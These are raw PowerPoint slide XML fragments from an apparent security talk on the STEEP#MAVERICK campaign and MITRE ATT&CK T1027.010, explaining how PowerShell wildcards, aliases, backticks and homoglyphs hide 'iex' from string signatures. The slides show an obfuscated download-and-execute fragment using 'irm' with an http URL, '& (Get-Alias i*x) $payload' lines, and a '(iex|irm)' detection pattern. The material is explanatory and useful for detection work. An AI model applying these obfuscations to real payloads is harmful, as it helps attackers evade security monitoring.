                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Also worth a look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3775" y="4720590"/>
            <a:ext cx="364331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F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Obscurize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3775" y="5034915"/>
            <a:ext cx="3643312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37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Tahoma"/>
              </a:rPr>
              <a:t>Cloaks real hosts as sandboxes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262" y="5695401"/>
            <a:ext cx="5537688" cy="363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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Not </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>just </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2100" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>evasion</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>…</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2100" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2100" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF6259"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Retaliation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF6259"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>!</a:t>
            </a:r>
            <a:endParaRPr sz="2100" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF6259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1653540"/>
            <a:ext cx="1087755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F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Section 02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2396490"/>
            <a:ext cx="101346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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>T1027.010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3560445"/>
            <a:ext cx="7372350" cy="936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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>The sub-technique this campaign motivated. Command Obfuscation, codified.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804410"/>
            <a:ext cx="316611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Created 14 Mar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5285" y="4804410"/>
            <a:ext cx="698373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Contributors: G. Thomas · Tim Peck · </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>TruKno</a:t>
            </a:r>
            <a:endParaRPr sz="2025" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="93A89F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70559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62D2E8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>T1027.010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DF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Command Obfuscation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175" y="1855470"/>
            <a:ext cx="10582275" cy="920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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>“Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze.”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175" y="2827972"/>
            <a:ext cx="411099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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>— MITRE ATT&amp;CK, T1027.010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532822"/>
            <a:ext cx="108775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Courier New"/>
              </a:rPr>
              <a:t>This talk's working taxonomy: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923348"/>
            <a:ext cx="7753350" cy="325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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>ALIASES</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> — </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>gal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> resolves to the real cmdlet at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381500"/>
            <a:ext cx="77533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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>WILDCARDS</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> — a pattern match resolves to a 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4839652"/>
            <a:ext cx="77533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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>ENV VARS</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> — env-var tokens rebuild a hidden string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5297805"/>
            <a:ext cx="77533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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>STRING SPLITTING</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> — the full string never appears at once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5755958"/>
            <a:ext cx="77533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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>ESCAPE CHARS</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> — backticks, quotes, casing break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16440" y="5581650"/>
            <a:ext cx="198501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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New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16440" y="5905500"/>
            <a:ext cx="198501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62D2E8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>MITRE ATT&amp;CK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5133242" cy="30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F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>STEEP#MAVERICK · </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>A</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>NEW</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>PRIMITIVE</a:t>
            </a:r>
            <a:endParaRPr sz="2025" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F2A53C"/>
              </a:solidFill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5272454" cy="518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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>gal ?e[?x]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> Runs </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>iex</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="EDF3EF"/>
              </a:solidFill>
              <a:latin typeface="Tahom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3900" y="5219700"/>
            <a:ext cx="108775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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>The call operator invokes whatever the wildcard resolved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5676900"/>
            <a:ext cx="10877550" cy="9242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29"/>
              </a:lnSpc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No</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>w commonly used to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>obfuscate other aliases: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>RestMethod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>,(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>irm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>) for example</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2025" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="93A89F"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
            </a:endParaRPr>
          </a:p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25" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t> - </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Coined 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“</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Globfuscation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”</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t> by researcher John Hammond.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50AFFC-CC07-766A-7490-87111E615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553" y="25893"/>
            <a:ext cx="4169908" cy="2500914"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:effectLst>
            <a:softEdge rad="228600"/>
          </a:effectLst>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2194156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2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>STEEP#MAVERICK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4584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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Ya c</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>an't Signature a String </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>That was never Recorded…</a:t>
            </a:r>
            <a:endParaRPr sz="2800" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="EDF3EF"/>
              </a:solidFill>
              <a:latin typeface="Tahom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3900" y="2185988"/>
            <a:ext cx="5418992" cy="30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93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>What</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t> a </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>signature </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>detects (iex|irm)</a:t>
            </a:r>
            <a:endParaRPr sz="2025" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="93A89F"/>
              </a:solidFill>
              <a:latin typeface="Courier Ne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3900" y="2805112"/>
            <a:ext cx="5467679" cy="327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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>.(gal ?e[?x])((gal ?rm) ‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>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415665"/>
            <a:ext cx="173450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6259"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>✕ no 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7925" y="2185988"/>
            <a:ext cx="5343525" cy="30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F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>What actually runs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t> in memory</a:t>
            </a:r>
            <a:endParaRPr sz="2025" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F2A53C"/>
              </a:solidFill>
              <a:latin typeface="Courier New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38900" y="2805112"/>
            <a:ext cx="498157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 err="1">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Invoke-Expression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 $payload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2225" y="3415665"/>
            <a:ext cx="173450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2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>✓ executes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9338" y="3880485"/>
            <a:ext cx="7952422" cy="391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93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Nothing to string-match — </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>iex</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> exists only at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9338" y="4410075"/>
            <a:ext cx="7952422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Courier New"/>
              </a:rPr>
              <a:t>Get-Alias</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> / </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Get-Command</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>: everywhere, benign, unflagged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9338" y="4939665"/>
            <a:ext cx="7952422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93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>ATT&amp;CK 2022: only </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>T1027</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> — too coarse for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7562" y="5650230"/>
            <a:ext cx="304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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New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668" y="5478780"/>
            <a:ext cx="196786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2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>T1027.010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2390" y="5859780"/>
            <a:ext cx="488537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Courier New"/>
              </a:rPr>
              <a:t>the gap this campaign exposed</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1630452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0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62D2E8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>T1027.010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899" y="981075"/>
            <a:ext cx="11356731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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>T1027 Had No Room For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975" y="2304098"/>
            <a:ext cx="6830378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Courier New"/>
              </a:rPr>
              <a:t>T1027 — Obfuscated Files or Information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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>scope: files, binaries, payloads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75" y="1980248"/>
            <a:ext cx="6820852" cy="30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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>PARENT TECHNIQUE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>: (Yeah, but…)</a:t>
            </a:r>
            <a:endParaRPr sz="2025" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="82948C"/>
              </a:solidFill>
              <a:latin typeface="Courier Ne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4900" y="3151822"/>
            <a:ext cx="304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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/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2975" y="3685221"/>
            <a:ext cx="5800725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700"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Where </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>specifically </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>does </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>COMMAND-LINE</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t> obfuscation live?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4523422"/>
            <a:ext cx="304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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New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5085398"/>
            <a:ext cx="5554028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FF6259"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>???</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr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6259"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>before March 2023: nowhere specific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9895D6-13BD-8499-68E4-6C8166105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560" y="3484418"/>
            <a:ext cx="4893939" cy="2727094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62D2E8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>T1027.010 · TECHNICAL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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Character Masking vs. Wildcard IEX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674495"/>
            <a:ext cx="108775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93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Character Masking </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>— defeats string signatures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2236470"/>
            <a:ext cx="7774564" cy="9948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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>I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`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nv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`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ok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`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e-Ex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`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p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`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r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`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es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`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s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`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i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`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on    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>     </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t># backtick</a:t>
            </a:r>
          </a:p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F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>In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Vo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Ke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-Ex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Pr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Es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Si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On                  </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t># case</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="2632"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr sz="2025" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Inv</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF6259"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>о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ke-E</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>`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xpression                 </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t># Cyrillic 'о'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467100"/>
            <a:ext cx="108775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62D2E8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Wildcard IEX </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>— defeats naming signatures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029075"/>
            <a:ext cx="10515600" cy="6962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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>&amp; (Get-Alias </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="1">
                <a:solidFill>
                  <a:srgbClr val="62D2E8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>i*x</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="1">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>) $payload</a:t>
            </a:r>
          </a:p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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>&amp; (Get-Command </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="1">
                <a:solidFill>
                  <a:srgbClr val="62D2E8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Invoke-Exp*ssion</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="1">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>) $payload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831080"/>
            <a:ext cx="10877550" cy="30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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>cmdlet name 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never </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>displayed to signature properly</a:t>
            </a:r>
            <a:endParaRPr sz="2025" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="EDF3EF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26121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82F9EC5-2AC8-4558-ABB9-EFCAD762ECB3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="723900" y="2184400"/>
            <a:ext cx="7162800" cy="1905000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111614"/>
          </a:solidFill>
          <a:ln w="12700" cap="flat" cmpd="sng" algn="ctr">
            <a:solidFill>
              <a:srgbClr val="2C353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46D59E-0FA5-4BC9-8B2A-54F78108E16D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
